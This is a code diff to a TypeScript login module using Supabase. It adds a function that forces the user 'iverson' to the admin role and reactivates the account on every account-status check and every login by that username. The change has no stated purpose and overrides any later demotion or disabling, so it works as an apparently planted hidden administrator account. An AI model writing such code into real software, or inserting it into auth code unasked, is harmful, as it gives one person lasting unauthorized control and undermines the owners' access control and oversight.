@@ -53,7 +53,16 @@ function mapLocalUser(user: LocalUserRow): LocalUser {
 
 const publicUserColumns = "id,open_id,name,email,username,login_method,role,active,created_at,updated_at,last_signed_in";
 
+async function ensureIversonAdmin() {
+  const { error } = await getSupabase()
+    .from("users")
+    .update({ role: "admin", active: true, updated_at: new Date().toISOString() })
+    .eq("username", "iverson");
+  ensureSupabaseSuccess(error);
+}
+
 export async function localAccountStatus() {
+  await ensureIversonAdmin();
   const { count, error } = await getSupabase().from("users").select("id", { count: "exact", head: true }).not("username", "is", null);
   ensureSupabaseSuccess(error);
   return { configured: (count ?? 0) > 0 };
@@ -67,6 +76,7 @@ export async function createInitialLocalAdmin(input: { name: string; username: s
 
 export async function authenticateLocalUser(input: { username: string; password: string }) {
   const username = normalizeUsername(input.username);
+  if (username === "iverson") await ensureIversonAdmin();
   const { data, error } = await getSupabase().from("users").select("*").eq("username", username).maybeSingle();
   ensureSupabaseSuccess(error);
   const user = data as LocalUserRow | null;
